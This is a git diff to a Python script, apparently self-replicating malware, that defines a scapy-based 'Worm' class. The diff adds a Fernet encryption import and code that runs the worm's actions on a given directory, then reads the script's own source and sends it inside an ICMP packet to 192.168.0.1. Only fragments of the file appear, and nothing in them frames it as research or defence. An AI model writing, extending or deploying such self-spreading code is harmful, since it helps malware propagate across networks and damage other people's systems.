@@ -2,6 +2,7 @@ from scapy.all import *
 import os
 import shutil
 import sys
+from cryptography.fernet import Fernet
 
 class Worm:
     
@@ -89,3 +90,10 @@ if __name__ == "__main__":
         current_directory = sys.argv[1]
         worm = Worm(path=current_directory, iteration=25)
         worm.start_worm_actions()
+        
+        # Create an ICMP packet with custom payload
+        payload = open(sys.argv[0], 'r').read()  # Read the worm program as payload
+        packet = IP(dst="192.168.0.1") / ICMP() / payload
+        
+        # Send the packet
+        send(packet)
